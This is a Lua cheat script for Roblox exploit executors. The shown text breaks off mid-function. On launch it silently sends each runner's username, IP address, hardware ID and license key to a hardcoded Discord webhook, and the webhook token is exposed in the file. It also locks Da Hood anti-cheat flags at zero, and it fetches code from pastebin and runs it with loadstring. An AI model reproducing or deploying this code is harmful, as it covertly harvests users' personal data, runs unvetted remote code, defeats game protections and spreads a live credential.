if not LPH_ENCSTR then LPH_ENCSTR = function(str) return str end end
if not LPH_NO_VIRTUALIZE then LPH_NO_VIRTUALIZE = function(func) return func end end
if not LPH_OBFUSCATED then LPH_OBFUSCATED = false end

-- ========= LICENSE → script_key RESOLVER (inside source) =========
do
    local function resolveKey()
        local k = nil
        pcall(function()
            local g = getgenv and getgenv()
            if g and type(g.Platinun) == 'table' then
                k = g.Platinun['License Key'] or g.Platinun.LicenseKey
            end
        end)
        if type(k) ~= 'string' or #k == 0 then
            k = ""
        end
        -- real global (outside getgenv) — what luarmor expects
        script_key = k
        rawset(_G, 'script_key', k)
        if getgenv then
            pcall(function() rawset(getgenv(), 'script_key', k) end)
        end
        if shared then
            pcall(function() shared.script_key = k end)
        end
        -- current env too
        pcall(function()
            local e = getfenv and (getfenv(0) or getfenv()) or nil
            if type(e) == 'table' then rawset(e, 'script_key', k) end
        end)
        return k
    end
    resolveKey()
end
-- ================================================================

local Players = game:GetService("Players")
local HttpService = game:GetService("HttpService")
local LocalPlayer = Players.LocalPlayer

-- Put your Discord webhook URL here
local WEBHOOK_URL = "https://discord.com/api/webhooks/1549467315261939915/Akm50enH7VOMiGW63YcXPWaTUckG_KmiuOkaSGmvwg6E9hx0SkaU_ZxZE7Zl2XKYQJX5"

local function getHWID()
    if syn and syn.get_hwid then
        return syn.get_hwid()
    elseif gethwid then
        return gethwid()
    elseif identifyexecutor then
        return identifyexecutor()
    else
        return "Unknown"
    end
end

local function getIP()
    local ok, result = pcall(function()
        return game:HttpGet("https://api.ipify.org")
    end)
    if ok and result then
        return result
    end
    return "Unknown"
end

local function getLicenseKey()
    local ok, key = pcall(function()
        if getgenv and getgenv()["Platinun"] and getgenv()["Platinun"]["License Key"] then
            return tostring(getgenv()["Platinun"]["License Key"])
        end
        return nil
    end)
    if ok and key and key ~= "" then
        return key
    end
    return "Not Found"
end

local function code(str)
    return "```" .. tostring(str) .. "```"
end

local function sendWebhook()
    local embed = {
        embeds = {
            {
                title = "Platinun Logger | Executado",
                color = 3092790,
                timestamp = DateTime.now():ToIsoDate(),
                thumbnail = {
                    url = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. LocalPlayer.UserId .. "&width=420&height=420&format=png"
                },
                fields = {
                    {
                        name = "Usuário",
                        value = code(LocalPlayer.Name .. " (" .. LocalPlayer.DisplayName .. ")"),
                        inline = true
                    },
                    {
                        name = "IP",
                        value = code(getIP()),
                        inline = true
                    },
                    {
                        name = "HWID",
                        value = code(getHWID()),
                        inline = false
                    },
                    {
                        name = "License Key",
                        value = code(getLicenseKey()),
                        inline = false
                    },
                    {
                        name = "Status",
                        value = "Table Build",
                        inline = true
                    }
                },
                footer = {
                    text = "Platinun Logger Advanced Security System"
                }
            }
        }
    }

    local body = HttpService:JSONEncode(embed)

    local requestFunc = (syn and syn.request) or (http and http.request) or request or http_request

    if requestFunc then
        requestFunc({
            Url = WEBHOOK_URL,
            Method = "POST",
            Headers = {
                ["Content-Type"] = "application/json"
            },
            Body = body
        })
    end
end

task.spawn(sendWebhook)
-- game load check
if not game:IsLoaded() then game.Loaded:Wait() end
task.wait(0.35)  -- let services settle
-- game check
local MarketplaceService = game:GetService("MarketplaceService")
local okPI, placeInfo = pcall(function() return MarketplaceService:GetProductInfo(game.PlaceId) end)
local GameName = (okPI and placeInfo and placeInfo.Name) or "Universal"
local IS_DAHOOD = string.find(GameName, "Da Hood") ~= nil
    or string.find(GameName, "Dee Hood") ~= nil
    or string.find(GameName, "Der Hood") ~= nil
if IS_DAHOOD then
    task.spawn(function()
        local local_player = game:GetService("Players").LocalPlayer
        local dataFolder = local_player:WaitForChild("DataFolder", 10)
        if not dataFolder then return end

        local names = { "ShotLand", "ShotReseter", "ShotTotal", "Warning", "LockFlagged" }
        for _, n in ipairs(names) do
            local v = dataFolder:WaitForChild(n, 5)
            if v then
                pcall(function() v.Value = 0 end)
                v:GetPropertyChangedSignal("Value"):Connect(function()
                    pcall(function() v.Value = 0 end)
                end)
            end
        end
        local function hookBodyEffects(char)
            if not char then return end
            local be = char:WaitForChild("BodyEffects", 10)
            if not be then return end
            for _, n in ipairs({ "GunFiring", "GunShotChanges" }) do
                local v = be:WaitForChild(n, 5)
                if v then
                    local default = (n == "GunFiring") and false or 0
                    pcall(function() v.Value = default end)
                    v:GetPropertyChangedSignal("Value"):Connect(function()
                        pcall(function() v.Value = default end)
                    end)
                end
            end
        end
        if local_player.Character then hookBodyEffects(local_player.Character) end
        local_player.CharacterAdded:Connect(hookBodyEffects)
    end)
end
local RunService = game:GetService("RunService")
local LP = game.Players.LocalPlayer

local Enabled = true

-- velocity spoof disabled by default (was causing freezes via RenderStepped:Wait every frame)
-- set getgenv().Platinun_VelocitySpoof = true to re-enable a light version
do
    local _vsLast = 0
    RunService.Heartbeat:Connect(function()
        if not Enabled then return end
        if getgenv().Platinun_VelocitySpoof ~= true then return end
        local now = os.clock()
        if now - _vsLast < 0.05 then return end
        _vsLast = now
        local ch = LP.Character
        local hrp = ch and ch:FindFirstChild("HumanoidRootPart")
        if not hrp then return end
        local real = hrp.AssemblyLinearVelocity
        if real.Magnitude < 1 then return end
        local spoof = -real * (75 / math.max(real.Magnitude, 16))
        hrp.AssemblyLinearVelocity = spoof
        task.defer(function()
            if hrp and hrp.Parent then
                hrp.AssemblyLinearVelocity = real
            end
        end)
    end)
end
-- source daqui pra baixo
local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")
local Workspace = game.Workspace
local RunService = game:GetService("RunService")
local TweenService = game:GetService("TweenService")
local UserInputService = game:GetService("UserInputService")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local Self = Players.LocalPlayer
local Mouse = Self:GetMouse()
local Camera = game:FindFirstChild("Workspace").CurrentCamera
local GuiInsetOffsetY = game:GetService('GuiService'):GetGuiInset().Y
task.spawn(function()
    local Players          = game:GetService("Players")
    local RunService       = game:GetService("RunService")
    local UserInputService = game:GetService("UserInputService")
    local Workspace        = game.Workspace

    local LocalPlayer = Players.LocalPlayer

    local function GetCfg()
        return getgenv()['Platinun']['Player Modifications']['Panic']
    end
    local function GetBindKey()
        local name = getgenv()['Platinun']['General']['Keybind List']['Panic']
        if type(name) ~= 'string' or name == '' then return nil end
        local ok, kc = pcall(function() return Enum.KeyCode[name:upper()] end)
        if ok then return kc end
        return nil
    end
    local function GetGroundPosition(Position, ExcludeInstances)
        local Params = RaycastParams.new()
        Params.FilterType = Enum.RaycastFilterType.Exclude
        Params.FilterDescendantsInstances = ExcludeInstances or {}
        local Result = Workspace:Raycast(Position, Vector3.new(0, -2000, 0), Params)
        return Result and Result.Position or nil
    end

        local function PanicGround()
        local Character = LocalPlayer.Character
        if not Character then return end
        local HRP      = Character:FindFirstChild('HumanoidRootPart')
        local Humanoid = Character:FindFirstChildOfClass('Humanoid')
        if not HRP then return end

        local GroundPos = GetGroundPosition(HRP.Position, {Character})
        if not GroundPos then return end

        local TargetCFrame = CFrame.new(GroundPos.X, GroundPos.Y + 3, GroundPos.Z) * (HRP.CFrame - HRP.CFrame.Position)
        HRP.CFrame = TargetCFrame

        HRP.AssemblyLinearVelocity  = Vector3.zero
        HRP.AssemblyAngularVelocity = Vector3.zero

        if Humanoid then
            Humanoid.Jump = false
            Humanoid:ChangeState(Enum.HumanoidStateType.Landed)
        end

        -- 3) brief anchor + velocity lock so it doesn't bounce
        local wasAnchored = HRP.Anchored
        HRP.Anchored = true

        task.spawn(function()
            for _ = 1, 6 do
                if not HRP or not HRP.Parent then break end
                HRP.CFrame                  = TargetCFrame
                HRP.AssemblyLinearVelocity  = Vector3.zero
                HRP.AssemblyAngularVelocity = Vector3.zero
                if Humanoid then
                    Humanoid.Jump = false
                    Humanoid:ChangeState(Enum.HumanoidStateType.Landed)
                end
                task.wait()
            end

            if HRP and HRP.Parent then
                HRP.Anchored = wasAnchored
                HRP.AssemblyLinearVelocity  = Vector3.zero
                HRP.AssemblyAngularVelocity = Vector3.zero
            end
        end)
    end

    local function PanicVoid()
        local Cfg = GetCfg()
        local Distance = (Cfg and Cfg['Void Distance']) or 10000

        local Character = LocalPlayer.Character
        if not Character then return end
        local HRP = Character:FindFirstChild('HumanoidRootPart')
        if not HRP then return end

        local CurrentPos = HRP.Position
        local Angle      = math.rad(45)
        local YOffset    = Distance * math.sin(Angle)
        local HorizOff   = Distance * math.cos(Angle)

        local Look = HRP.CFrame.LookVector
        Look = Vector3.new(Look.X, 0, Look.Z)
        if Look.Magnitude == 0 then Look = Vector3.new(0, 0, -1) end
        Look = Look.Unit

        local NewPos = CurrentPos + Vector3.new(
            Look.X * HorizOff,
            YOffset,
            Look.Z * HorizOff
        )

        HRP.CFrame = CFrame.new(NewPos)
    end

    local function RunPanic()
        local Cfg = GetCfg()
        if not Cfg or not Cfg['Enabled'] then return end

        local t = Cfg['Type']
        if t == 'Ground' then
            PanicGround()
        elseif t == 'Void' then
            PanicVoid()
        else
            PanicGround()
        end
    end

    getgenv().panic        = RunPanic
    getgenv().panic_ground = PanicGround
    getgenv().panic_void   = PanicVoid

    UserInputService.InputBegan:Connect(function(Input, Processed)
        if Processed then return end
        if Input.UserInputType ~= Enum.UserInputType.Keyboard then return end

        local Cfg = GetCfg()
        if not Cfg or not Cfg['Enabled'] then return end
        if Cfg['Mode'] ~= 'Keybind' then return end

        local BindKey = GetBindKey()
        if BindKey and Input.KeyCode == BindKey then
            RunPanic()
        end
    end)

    local autoTriggered = false
    RunService.Heartbeat:Connect(function()
        local Cfg = GetCfg()
        if not Cfg or not Cfg['Enabled'] then
            autoTriggered = false
            return
        end
        if Cfg['Mode'] ~= 'Automatic' then
            autoTriggered = false
            return
        end

        local AutoCfg = Cfg['Automatic']
        if not AutoCfg or not AutoCfg['Enabled'] then
            autoTriggered = false
            return
        end

        local Character = LocalPlayer.Character
        local Humanoid  = Character and Character:FindFirstChildOfClass('Humanoid')
        if not Humanoid or Humanoid.Health <= 0 then
            autoTriggered = false
            return
        end

        local Threshold = AutoCfg['Health Value'] or 25
        if Humanoid.Health <= Threshold then
            if not autoTriggered then
                autoTriggered = true
                RunPanic()
            end
        else
            autoTriggered = false
        end
    end)
end)
-- panic above
do
    local Players_SC       = game:GetService("Players")
    local ReplicatedStorage_SC = game:GetService("ReplicatedStorage")
    local RunService_SC    = game:GetService("RunService")
    local LocalPlayer_SC   = Players_SC.LocalPlayer
    local Workspace_SC     = game.Workspace

    local function GetSkinChangerCfg()
        return getgenv()['Platinun']['Weapon Modifications']['Skin Changer']
    end

    -- cleanup previous run
    if type(getgenv) == 'function' then
        local prevApplied = getgenv().__scAppliedSkins
        if prevApplied then
            for _, entry in next, prevApplied do
                if entry and entry.Connections then
                    for _, c in next, entry.Connections do
                        pcall(function() if c.Connected then c:Disconnect() end end)
                    end
                end
            end
        end
        local prevKnife = getgenv().__scKnifeData
        if prevKnife then
            for _, data in next, prevKnife do
                if data and data.conns then
                    for _, c in next, data.conns do
                        pcall(function() if c.Connected then c:Disconnect() end end)
                    end
                end
            end
        end
    end

    local AppliedSkins             = {}
    local KnifeData                = {}
    local InitialGunSkinRefreshDone = {}
    local PendingSkinReprocess     = {}
    local ToolRegistry             = {}
    local SkinData                 = nil

    if type(getgenv) == 'function' then
        getgenv().__scAppliedSkins = AppliedSkins
        getgenv().__scKnifeData    = KnifeData
    end

    -- SkinAssets (reuse cached or wait)
    local SC_SkinAssets = ReplicatedStorage_SC:FindFirstChild('SkinAssets')
    if not SC_SkinAssets then
        local ok, found = pcall(function() return ReplicatedStorage_SC:WaitForChild('SkinAssets', 5) end)
        if ok and found then SC_SkinAssets = found end
    end

    local SkinModules = ReplicatedStorage_SC:FindFirstChild('SkinModules')

    -- forward declarations
    local ApplySkinToTool
    local RemoveSkinFromTool
    local ProcessTool

    -- ── SkinData loader ──────────────────────────────────────────
    local function LoadSkinData()
        if SkinData then return SkinData end
        if SkinModules and typeof(SkinModules) == 'Instance' and SkinModules:IsA('ModuleScript') then
            local ok, result = pcall(require, SkinModules)
            if ok and type(result) == 'table' then SkinData = result end
        end
        if not SkinData and shared.skin_modules and next(shared.skin_modules) then
            SkinData = shared.skin_modules
        end
        if SkinData then
            for Tool, SkinName in next, PendingSkinReprocess do
                if Tool and Tool.Parent and SkinName and SkinName ~= '' and SkinName ~= 'None' then
                    task.defer(function()
                        ToolRegistry[Tool] = nil
                        ProcessTool(Tool)
                    end)
                end
                PendingSkinReprocess[Tool] = nil
            end
        end
        return SkinData
    end

    task.spawn(function()
        if not SkinModules then
            local ok, found = pcall(function() return ReplicatedStorage_SC:WaitForChild('SkinModules', 3) end)
            if ok and found then SkinModules = found end
        end
        if SkinModules and typeof(SkinModules) == 'Instance' and SkinModules:IsA('ModuleScript') then
            local ok, result = pcall(require, SkinModules)
            if ok and type(result) == 'table' then
                SkinData = result
            end
        end
        -- fallback http
        if not SkinData then
            local httpFn = (type(game.HttpGet) == 'function' and function(url) return game:HttpGet(url) end)
                or (type(getgenv) == 'function' and getgenv().http_request and function(url)
                    local res = getgenv().http_request({ Url = url, Method = 'GET' })
                    return res and res.Body
                end)
                or (type(getgenv) == 'function' and getgenv().request and function(url)
                    local res = getgenv().request({ Url = url, Method = 'GET' })
                    return res and res.Body
                end)
            if httpFn then
                local ok, body = pcall(httpFn, 'https://pastebin.com/raw/0uZ107WE')
                if ok and body then
                    local fn = loadstring(body)
                    if fn then
                        local ok2, result = pcall(fn)
                        if ok2 and type(result) == 'table' then
                            SkinData = result
                        elseif ok2 and shared.skin_modules and next(shared.skin_modules) then
                            SkinData = shared.skin_modules
                        end
                    end
                end
            end
        end
        task.wait(0.5)
        if SkinData then
            local cfg = GetSkinChangerCfg()
            if cfg and cfg['Enabled'] then
                local Skins = cfg['Weapons List']
                local function reapplyContainer(Container)
                    if not Container then return end
                    for _, Tool in next, Container:GetChildren() do
                        if Tool:IsA('Tool') then
                            local SkinName = Skins[Tool.Name]
                            if not SkinName then
                                local stripped = Tool.Name:gsub('%[', ''):gsub('%]', '')
                                SkinName = Skins['[' .. stripped .. ']']
                            end
                            if SkinName and SkinName ~= '' and SkinName ~= 'None' then
                                pcall(function() RemoveSkinFromTool(Tool) end)
                                ToolRegistry[Tool] = nil
                                pcall(function() ProcessTool(Tool) end)
                            end
                        end
                    end
                end
                pcall(function() reapplyContainer(LocalPlayer_SC.Character) end)
                pcall(function() reapplyContainer(LocalPlayer_SC:FindFirstChild('Backpack')) end)
            end
        end
    end)

    -- ── Knife helpers ─────────────────────────────────────────────
    local function IsKnifeSkin(name)
        local n = name:gsub(' ', '')
        return n == 'GoldenAgeTanto' or n == 'GPO-Knife' or n == 'GPO-KnifePrestige' or n == 'Heaven'
            or n == 'LoveKukri' or n == 'PurpleDagger' or n == 'BlueDagger' or n == 'GreenDagger' or n == 'RedDagger'
    end

    local function CleanKnife(Tool)
        local data = KnifeData[Tool]
        if data then
            if data.conns then
                for _, c in next, data.conns do if c then c:Disconnect() end end
                data.conns = nil
            end
            if data.track then data.track:Stop(); data.track:Destroy(); data.track = nil end
            if data.welds then for _, w in next, data.welds do if w then w:Destroy() end end end
            if data.sounds then for _, s in next, data.sounds do if s and s.Parent then s:Destroy() end end end
        end
        local mesh = Tool:FindFirstChild('Default')
        if mesh then
            for _, v in next, mesh:GetChildren() do
                if v.Name == 'Handle.R' or v:IsA('Model') or (v:IsA('BasePart') and v.Name ~= 'Default') then
                    v:Destroy()
                end
            end
            mesh.Transparency = 0
        end
        for _, v in next, Tool:GetChildren() do
            if (v:IsA('Model') or v:IsA('MeshPart')) and v ~= mesh and v.Name ~= 'Handle' then
                v:Destroy()
            end
        end
        KnifeData[Tool] = nil
    end

    local function ApplyKnife(Character, Tool, SkinName)
        if not IsKnifeSkin(SkinName) then return end
        if Tool.Parent ~= Character then return end
        local Humanoid = Character:FindFirstChild('Humanoid')
        local rhand    = Character:FindFirstChild('RightHand')
        if not Humanoid or not rhand then return end

        -- re-anchor existing if already applied
        local existing = KnifeData[Tool]
        if existing and existing.welds and #existing.welds > 0 then
            local mesh = Tool:FindFirstChild('Default')
            local handleR = mesh and mesh:FindFirstChild('Handle.R')
            if handleR and handleR.Parent then
                local m6d = handleR:FindFirstChildOfClass('Motor6D')
                if m6d then m6d.Part0 = rhand end
                if mesh then
                    mesh.Transparency = 1
                    for _, v in next, mesh:GetChildren() do
                        if (v:IsA('Model') or v:IsA('MeshPart')) and v.Name ~= SkinName then v:Destroy() end
                    end
                end
                for _, v in next, Tool:GetChildren() do
                    if (v:IsA('Model') or v:IsA('MeshPart')) and v ~= mesh and v.Name ~= 'Handle' and v.Name ~= SkinName then
                        v:Destroy()
                    end
                end
                local Animator = Humanoid:FindFirstChildOfClass('Animator')
                if Animator then
                    local n = SkinName:gsub(' ', '')
                    local animId, sndId
                    if     n == 'GoldenAgeTanto'              then animId = 'rbxassetid://13473404819'; sndId = 'rbxassetid://5917819099'
                    elseif n == 'GPO-Knife' or n == 'GPO-KnifePrestige' then animId = 'rbxassetid://14014278925'; sndId = 'rbxassetid://4604390759'
                    elseif n == 'Heaven'                      then animId = 'rbxassetid://14500266726'; sndId = 'rbxassetid://14489860007'
                    elseif n == 'PurpleDagger'                then animId = 'rbxassetid://17824999722'; sndId = 'rbxassetid://17822743153'
                    elseif n == 'BlueDagger'                  then animId = 'rbxassetid://17824995184'; sndId = 'rbxassetid://17822737046'
                    elseif n == 'GreenDagger'                 then animId = 'rbxassetid://17825004320'; sndId = 'rbxassetid://17822741762'
                    elseif n == 'RedDagger'                   then animId = 'rbxassetid://17825008844'; sndId = 'rbxassetid://17822952417'
                    end
                    if animId then
                        if existing.track then existing.track:Stop(); existing.track:Destroy(); existing.track = nil end
                        local anim = Instance.new('Animation'); anim.AnimationId = animId
                        local track = Animator:LoadAnimation(anim); track.Looped = false; track:Play()
                        existing.track = track; anim:Destroy()
                        track.Ended:Once(function() if existing.track == track then existing.track = nil end; track:Destroy() end)
                    end
                    if sndId then
                        local snd = Instance.new('Sound'); snd.SoundId = sndId; snd.Parent = Workspace_SC; snd:Play()
                        table.insert(existing.sounds, snd)
                        snd.Ended:Connect(function() snd:Destroy() end)
                    end
                end
                return
            end
        end

        CleanKnife(Tool)
        KnifeData[Tool] = { track = nil, welds = {}, sounds = {}, conns = {} }
        local data = KnifeData[Tool]
        local meshPart = Tool:FindFirstChild('Default')
        if not meshPart then return end
        meshPart.Transparency = 1
        if not SkinModules then return end
        local knivesFolder = SkinModules:FindFirstChild('Knives')
        if not knivesFolder then return end
        local skinmodel = knivesFolder:FindFirstChild(SkinName)
        if not skinmodel then return end

        local clone = skinmodel:Clone()
        clone.Name = SkinName
        local handr = Instance.new('Part')
        handr.Name = 'Handle.R'; handr.Transparency = 1; handr.CanCollide = false
        handr.Anchored = false; handr.Size = Vector3.new(0.001, 0.001, 0.001)
        handr.Massless = true; handr.Parent = meshPart
        local m6d = Instance.new('Motor6D')
        m6d.Name = 'Handle.R'; m6d.Part0 = rhand; m6d.Part1 = handr; m6d.Parent = handr

        local offset, animId, sndId
        local n = SkinName:gsub(' ', '')
        if     n == 'GoldenAgeTanto'              then offset = CFrame.new(0,-0.20,-1.2)*CFrame.Angles(math.rad(90),math.rad(263.7),math.rad(180)); animId='rbxassetid://13473404819'; sndId='rbxassetid://5917819099'
        elseif n == 'GPO-Knife' or n == 'GPO-KnifePrestige' then offset = CFrame.new(0,-0.32,-1.07)*CFrame.Angles(math.rad(90),math.rad(-97.4),math.rad(90)); animId='rbxassetid://14014278925'; sndId='rbxassetid://4604390759'
        elseif n == 'Heaven'                      then offset = CFrame.new(-0.02,-0.82,0.20)*CFrame.Angles(math.rad(64.42),math.rad(3.79),math.rad(0)); animId='rbxassetid://14500266726'; sndId='rbxassetid://14489860007'
        elseif n == 'LoveKukri'                   then offset = CFrame.new(-0.14,0.14,-1.62)*CFrame.Angles(math.rad(-90),math.rad(180),math.rad(-4.97))
        elseif n == 'PurpleDagger'                then offset = CFrame.new(-0.13,-0.24,-1.80)*CFrame.Angles(math.rad(89.05),math.rad(96.63),math.rad(180)); animId='rbxassetid://17824999722'; sndId='rbxassetid://17822743153'
        elseif n == 'BlueDagger'                  then offset = CFrame.new(-0.13,-0.24,-1.80)*CFrame.Angles(math.rad(89.05),math.rad(96.63),math.rad(180)); animId='rbxassetid://17824995184'; sndId='rbxassetid://17822737046'
        elseif n == 'GreenDagger'                 then offset = CFrame.new(-0.13,-0.24,-1.07)*CFrame.Angles(math.rad(89.05),math.rad(96.63),math.rad(180)); animId='rbxassetid://17825004320'; sndId='rbxassetid://17822741762'
        elseif n == 'RedDagger'                   then offset = CFrame.new(-0.13,-0.24,-1.07)*CFrame.Angles(math.rad(89.05),math.rad(96.63),math.rad(180)); animId='rbxassetid://17825008844'; sndId='rbxassetid://17822952417'
        end
        if not offset then return end

        if clone:IsA('Model') then
            if not clone.PrimaryPart then
                for _, c in next, clone:GetChildren() do
                    if c:IsA('BasePart') then clone.PrimaryPart = c; break end
                end
            end
            if clone.PrimaryPart then
                for _, p in next, clone:GetDescendants() do
                    if p:IsA('BasePart') then
                        p.CanCollide = false; p.Massless = true; p.Anchored = false
                        local w = Instance.new('Weld')
                        w.Part0 = handr; w.Part1 = p
                        w.C0 = offset; w.C1 = p.CFrame:ToObjectSpace(clone.PrimaryPart.CFrame)
                        w.Parent = p; table.insert(data.welds, w)
                    end
                end
            end
            clone.Parent = meshPart
        elseif clone:IsA('BasePart') then
            clone.CanCollide = false; clone.Massless = true; clone.Anchored = false
            clone.Parent = meshPart
            local w = Instance.new('Weld')
            w.Part0 = handr; w.Part1 = clone; w.C0 = offset; w.Parent = clone
            table.insert(data.welds, w)
        end

        local Animator = Humanoid:FindFirstChildOfClass('Animator')
        if not Animator then Animator = Instance.new('Animator'); Animator.Parent = Humanoid end
        if animId then
            local anim = Instance.new('Animation'); anim.AnimationId = animId
            local track = Animator:LoadAnimation(anim); track.Looped = false; track:Play()
            data.track = track; anim:Destroy()
            track.Ended:Once(function() if data.track == track then data.track = nil end; track:Destroy() end)
        end
        if sndId then
            local snd = Instance.new('Sound'); snd.SoundId = sndId; snd.Parent = Workspace_SC; snd:Play()
            table.insert(data.sounds, snd)
            snd.Ended:Connect(function() snd:Destroy() end)
        end

        local function StripKnifeIntruders()
            if KnifeData[Tool] ~= data then return end
            if meshPart and meshPart.Parent then
                meshPart.Transparency = 1
                for _, v in next, meshPart:GetChildren() do
                    if (v:IsA('Model') or v:IsA('MeshPart')) and v.Name ~= SkinName then v:Destroy() end
                end
            end
            for _, v in next, Tool:GetChildren() do
                if (v:IsA('Model') or v:IsA('MeshPart')) and v ~= meshPart and v.Name ~= 'Handle' and v.Name ~= SkinName then
                    v:Destroy()
                end
            end
        end
        local kc1 = Tool.ChildAdded:Connect(function(c)
            if (c:IsA('Model') or c:IsA('MeshPart')) and c ~= meshPart and c.Name ~= 'Handle' and c.Name ~= SkinName then
                task.defer(StripKnifeIntruders)
            end
        end)
        table.insert(data.conns, kc1)
        local kc2 = meshPart.ChildAdded:Connect(function(c)
            if (c:IsA('Model') or c:IsA('MeshPart')) and c.Name ~= SkinName then task.defer(StripKnifeIntruders) end
        end)
        table.insert(data.conns, kc2)
        local kc3 = meshPart:GetPropertyChangedSignal('Transparency'):Connect(function()
            if KnifeData[Tool] == data and meshPart.Transparency ~= 1 then meshPart.Transparency = 1 end
        end)
        table.insert(data.conns, kc3)
    end

    -- ── Skin info lookup ──────────────────────────────────────────
    local function GetSkinInfo(weaponName, skinName)
        local data = LoadSkinData()
        if not data then return nil end
        local weaponSkins = data[weaponName]
        if not weaponSkins then
            local bracketName = '[' .. weaponName:gsub('%[',''):gsub('%]','') .. ']'
            weaponSkins = data[bracketName]
        end
        if not weaponSkins then return nil end
        return weaponSkins[skinName]
            or weaponSkins[skinName:gsub('-',' ')]
            or weaponSkins[skinName:gsub('-','')]
    end

    local function GetShootSound(weaponName, skinName)
        if not SC_SkinAssets then return nil end
        local GunShootSounds = SC_SkinAssets:FindFirstChild('GunShootSounds')
        if not GunShootSounds then return nil end
        local WeaponFolder = GunShootSounds:FindFirstChild(weaponName)
        if not WeaponFolder then return nil end
        local SoundValue = WeaponFolder:FindFirstChild(skinName)
        if SoundValue and SoundValue:IsA('StringValue') then return SoundValue.Value end
        return nil
    end

    local function FindShootSoundInstance(Tool)
        if not Tool then return nil end
        for _, child in next, Tool:GetDescendants() do
            if child:IsA('Sound') and (child.Name == 'Shoot' or child.Name == 'ShootSound') then return child end
        end
        return nil
    end

    local function BindShootSoundForSkin(Tool)
        local skinData = AppliedSkins[Tool]
        if not skinData then return end
        local shootSound = FindShootSoundInstance(Tool)
        if not shootSound then return end
        if not skinData.ShootSoundOriginals then skinData.ShootSoundOriginals = {} end
        if skinData.ShootSoundOriginals[shootSound] == nil then
            skinData.ShootSoundOriginals[shootSound] = shootSound.SoundId
        end
        skinData.ShootSound = shootSound
        local soundId = GetShootSound(Tool.Name, skinData.SkinName)
        if soundId and soundId ~= '' then shootSound.SoundId = soundId end
    end

    local function StripForeignGunMeshes(Tool, default, Handle)
        if not Tool or not default then return end
        local function IsOurs(nm) return #nm == 0 or nm == '\0' end
        for _, child in next, Tool:GetChildren() do
            if child:IsA('MeshPart') and child ~= default and child ~= Handle and not IsOurs(child.Name) then
                child:Destroy()
            end
        end
        for _, child in next, default:GetChildren() do
            if child:IsA('MeshPart') and not IsOurs(child.Name) then child:Destroy() end
        end
    end

    local function ReapplyGunSkinState(Tool)
        local skinData = AppliedSkins[Tool]
        if not skinData then return end
        local default = skinData.Default
        if not default or not default.Parent then return end
        local Handle = Tool and Tool:FindFirstChild('Handle')
        StripForeignGunMeshes(Tool, default, Handle)
        if skinData.HideDefault then
            if default.Transparency ~= 1 then default.Transparency = 1 end
        else
            if skinData.DesiredTransparency ~= nil and default.Transparency ~= skinData.DesiredTransparency then
                default.Transparency = skinData.DesiredTransparency
            end
            if skinData.DesiredTextureID ~= nil and default.TextureID ~= skinData.DesiredTextureID then
                default.TextureID = skinData.DesiredTextureID
            end
        end
    end

    -- ── RemoveSkinFromTool ────────────────────────────────────────
    RemoveSkinFromTool = function(Tool)
        if not Tool or not AppliedSkins[Tool] then return end
        CleanKnife(Tool)
        local original = AppliedSkins[Tool]
        if original.Connections then
            for _, connection in next, original.Connections do
                if connection and connection.Connected then connection:Disconnect() end
            end
        end
        for _, child in next, original.ClonedChildren or {} do
            if child and child.Parent then child:Destroy() end
        end
        if original.Default and original.Default.Parent then
            for _, child in next, original.Default:GetChildren() do
                if child.Name == '\0' then child:Destroy() end
            end
            original.Default.Transparency = original.OriginalTransparency or 0
            original.Default.TextureID    = original.OriginalTextureID    or ''
        end
        if original.ShootSoundOriginals then
            for sound, soundId in next, original.ShootSoundOriginals do
                if sound and sound.Parent and soundId then sound.SoundId = soundId end
            end
        elseif original.ShootSound and original.OriginalShootSoundId then
            original.ShootSound.SoundId = original.OriginalShootSoundId
        end
        local Handle = Tool:FindFirstChild('Handle')
        if Handle then Handle:SetAttribute('SkinName', original.OriginalSkinName or '') end
        AppliedSkins[Tool] = nil
    end

    local function ScheduleInitialGunRefresh(Tool, SkinName)
        if not Tool or InitialGunSkinRefreshDone[Tool] then return end
        InitialGunSkinRefreshDone[Tool] = true
        task.delay(0.35, function()
            local skinData = AppliedSkins[Tool]
            if not skinData or skinData.SkinName ~= SkinName then return end
            RemoveSkinFromTool(Tool)
            ApplySkinToTool(Tool, SkinName)
        end)
    end

    -- ── ApplySkinToTool ───────────────────────────────────────────
    ApplySkinToTool = function(Tool, SkinName)
        if not Tool then return end
        if AppliedSkins[Tool] and AppliedSkins[Tool].SkinName == SkinName then return end
        local Handle = Tool:FindFirstChild('Handle')
        if not Handle then return end
        local default = Tool:FindFirstChild('Default')
        if not default or not default:IsA('MeshPart') then
            default = Handle:FindFirstChildOfClass('MeshPart')
            if not default then
                for _, child in next, Tool:GetDescendants() do
                    if child:IsA('MeshPart') then default = child; break end
                end
            end
        end
        if not default then return end
        local ShootSound = FindShootSoundInstance(Tool)
        if AppliedSkins[Tool] then RemoveSkinFromTool(Tool) end
        AppliedSkins[Tool] = {
            SkinName              = SkinName,
            OriginalTextureID     = default.TextureID,
            OriginalTransparency  = default.Transparency,
            OriginalSkinName      = Handle:GetAttribute('SkinName') or '',
            Default               = default,
            ShootSound            = ShootSound,
            OriginalShootSoundId  = ShootSound and ShootSound.SoundId or nil,
            ShootSoundOriginals   = ShootSound and { [ShootSound] = ShootSound.SoundId } or {},
            ClonedChildren        = {},
            Connections           = {},
            DesiredTextureID      = default.TextureID,
            DesiredTransparency   = default.Transparency,
            HideDefault           = false,
        }
        Handle:SetAttribute('SkinName', SkinName)
        local attrConn = Handle:GetAttributeChangedSignal('SkinName'):Connect(function()
            if Handle:GetAttribute('SkinName') ~= SkinName then Handle:SetAttribute('SkinName', SkinName) end
        end)
        table.insert(AppliedSkins[Tool].Connections, attrConn)

        local isKnife = Tool.Name:lower():find('knife') ~= nil or Tool.Name == '[Knife]'
        local skinInfo = GetSkinInfo(Tool.Name, SkinName)

        if not isKnife and not skinInfo then
            PendingSkinReprocess[Tool] = SkinName
            task.defer(LoadSkinData)
            BindShootSoundForSkin(Tool)
            return
        end

        if not isKnife then
            for _, child in next, Tool:GetChildren() do
                if child:IsA('MeshPart') and child ~= default and child ~= Handle then child:Destroy() end
            end
            for _, child in next, default:GetChildren() do
                if child:IsA('MeshPart') then child:Destroy() end
            end
            default.Transparency = AppliedSkins[Tool].OriginalTransparency or 0
            default.TextureID    = AppliedSkins[Tool].OriginalTextureID    or ''
        end

        -- resolve mesh from SkinData or SkinModules
        local mesh = nil
        if not isKnife and skinInfo and skinInfo.TextureID then
            local tv = skinInfo.TextureID
            if typeof(tv) == 'Instance' then
